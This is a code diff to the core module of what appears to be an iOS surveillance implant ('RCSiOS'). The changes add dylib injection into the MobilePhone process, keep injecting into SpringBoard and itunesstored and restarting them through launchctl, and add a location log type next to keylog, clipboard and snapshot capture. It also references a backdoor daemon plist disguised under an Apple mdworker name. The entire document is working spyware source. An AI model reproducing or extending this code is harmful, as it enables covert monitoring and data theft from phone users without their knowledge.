@@ -1,7 +1,5 @@
 /*
  * RCSiOS - Core
- *  pon pon
- *
  *
  * Created on 07/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
@@ -9,6 +7,7 @@
  */
 
 #import <CommonCrypto/CommonDigest.h>
+#import <unistd.h>
 #import <sys/ioctl.h>
 #import <fcntl.h>
 #import <sys/socket.h>
@@ -66,7 +65,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   
   snprintf(statment, 
            sizeof(statment), 
-           "/bin/launchctl %s \"/System/Library/LaunchDaemons/%s\"", 
+           "/bin/launchctl %s %s", 
            aCommand, 
            aDaemon);
   
@@ -144,16 +143,16 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   // Dylib injection
   if (injectDylib(SB_PATHNAME) == YES)
     {
-      [self launchCtl: "com.apple.SpringBoard.plist" command: "unload"];
+      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "unload"];
       usleep(500000);
-      [self launchCtl: "com.apple.SpringBoard.plist" command: "load"];
+      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "load"];
     }
   
   if (injectDylib(IT_PATHNAME) == YES) 
     {
-      [self launchCtl: "com.apple.itunesstored.plist" command: "unload"];
+      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
       usleep(500000);
-      [self launchCtl: "com.apple.itunesstored.plist" command: "load"];
+      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
     }
   
   return TRUE;
@@ -208,8 +207,8 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   removeDylibFromPlist(sbPathname);
   removeDylibFromPlist(itPathname);
   
-  [self launchCtl: "com.apple.itunesstored.plist" command: "unload"];
-  [self launchCtl: "com.apple.itunesstored.plist" command: "load"];
+  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
+  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
   
   [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                              error: nil];
@@ -218,8 +217,6 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   
   if (mLockSock != -1)
     close(mLockSock);
-  
-  [self launchCtl: "com.apple.mdworker.plist" command: "remove"];
     
   [[NSFileManager defaultManager] removeItemAtPath: BACKDOOR_DAEMON_PLIST
                                              error: nil];
@@ -227,6 +224,8 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   checkAndRunDemoMode();
   
   sleep(1);
+  
+  [self launchCtl: "com.apple.mdworker" command: "remove"];
   
   [dylibPathname release];
   
@@ -276,9 +275,9 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
       [dylib release];                                   
     
       // Forcing a SpringBoard reload
-      [self launchCtl:"com.apple.SpringBoard.plist" command:"unload"];
+      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"unload"];
       usleep(500000);
-      [self launchCtl:"com.apple.SpringBoard.plist" command:"load"];
+      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"load"];
     }
   
   [updateDylib release];
@@ -476,6 +475,7 @@ typedef struct _coreMessage_t
     case LOG_CLIPBOARD:
     case LOG_KEYLOG:
     case LOG_SNAPSHOT:
+    case LOGTYPE_LOCATION_NEW:
     {
       [self dispatchToLogManager:aMessage];
       break;
@@ -614,6 +614,7 @@ typedef struct _coreMessage_t
     return TRUE;
   
   pid_t sb_pid = getPidByProcessName(@"SpringBoard");
+  pid_t mp_pid = getPidByProcessName(@"MobilePhone");
   
   if (sb_pid > 0 &&  sb_pid != mSBPid) 
     {
@@ -626,6 +627,8 @@ typedef struct _coreMessage_t
         bRet = TRUE;
       else
         bRet = FALSE;
+      
+      injectDylibToProc(mp_pid, dylbPathname);
     }
   
   return bRet;
@@ -680,6 +683,11 @@ typedef struct _coreMessage_t
   createInfoLog(@"Start");
   
   [self injectSpringBoard];
+  
+  /*
+   * enable main runloop for battery notification
+   */
+  [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
   
   while ([self mMainLoopControlFlag] != CORE_STOPPED)
     {
